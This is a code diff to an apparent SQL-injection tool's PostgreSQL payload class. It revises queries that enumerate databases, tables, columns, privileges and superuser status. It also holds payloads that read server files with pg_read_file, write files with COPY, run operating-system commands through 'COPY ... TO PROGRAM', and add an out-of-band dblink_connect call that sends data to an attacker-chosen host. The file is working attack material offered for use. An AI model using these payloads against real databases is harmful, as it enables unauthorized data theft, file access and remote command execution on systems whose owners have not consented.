@@ -8,6 +8,7 @@ class PostgreSQLPayloads:
     name = "postgresql"
     comment = "-- "
     inline_comment = "/*!*/"
+    substitution_char = "s"
 
     @staticmethod
     def version() -> List[str]:
@@ -19,21 +20,20 @@ class PostgreSQLPayloads:
     @staticmethod
     def databases() -> List[str]:
         return [
-            "SELECT datname FROM pg_database",
+            "SELECT string_agg(datname, ',') FROM pg_database",
         ]
 
     @staticmethod
     def tables(db: str) -> List[str]:
         return [
-            "SELECT tablename FROM pg_tables WHERE schemaname='public'",
-            f"SELECT tablename FROM pg_tables WHERE tableowner=(SELECT usename FROM pg_catalog.pg_user WHERE usesysid=(SELECT usesysid FROM pg_catalog.pg_user WHERE usename='{db}'))",
+            f"SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public'",
+            "SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname NOT IN ('pg_catalog', 'information_schema')",
         ]
 
     @staticmethod
     def columns(db: str, table: str) -> List[str]:
         return [
-            f"SELECT column_name FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}'",
-            f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
+            f"SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='{table}'",
         ]
 
     @staticmethod
@@ -45,7 +45,7 @@ class PostgreSQLPayloads:
 
     @staticmethod
     def current_user() -> List[str]:
-        return ["SELECT current_user", "SELECT user"]
+        return ["SELECT current_user", "SELECT current_user;"]
 
     @staticmethod
     def current_db() -> List[str]:
@@ -68,34 +68,38 @@ class PostgreSQLPayloads:
         return ["SELECT version()"]
 
     @staticmethod
+    def is_dba() -> List[str]:
+        return ["SELECT usesuper FROM pg_user WHERE usename=current_user"]
+
+    @staticmethod
     def is_admin() -> List[str]:
-        return [
-            "SELECT usesuper FROM pg_user WHERE usename=current_user",
-            "SELECT 1 FROM pg_roles WHERE rolname=current_user AND rolsuper=true",
-        ]
+        return ["SELECT usesuper FROM pg_user WHERE usename=current_user"]
 
     @staticmethod
     def privileges() -> List[str]:
-        return [
-            "SELECT grantee, privilege_type FROM information_schema.role_column_grants WHERE grantee=current_user",
-            "SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'member')",
-        ]
+        return ["SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE grantee=current_user"]
 
     @staticmethod
     def file_read(path: str) -> List[str]:
         return [
             f"SELECT pg_read_file('{path}')",
-            f"SELECT convert_from(pg_read_binary_file('{path}'), 'UTF8')",
         ]
 
     @staticmethod
     def file_write(path: str, content: str) -> List[str]:
+        escaped = content.replace("'", "''")
         return [
-            f"COPY (SELECT E'{content}') TO '{path}'",
+            f"COPY (SELECT E'{escaped}') TO '{path}'",
         ]
 
     @staticmethod
     def os_cmd(cmd: str) -> List[str]:
         return [
-            f"SELECT dblink_exec('dbname=postgres', '{cmd}')",
+            f"COPY (SELECT 1) TO PROGRAM '{cmd}'",
+        ]
+
+    @staticmethod
+    def oob_call(target: str, data: str) -> List[str]:
+        return [
+            f"SELECT dblink_connect('host={target} dbname={data}')",
         ]
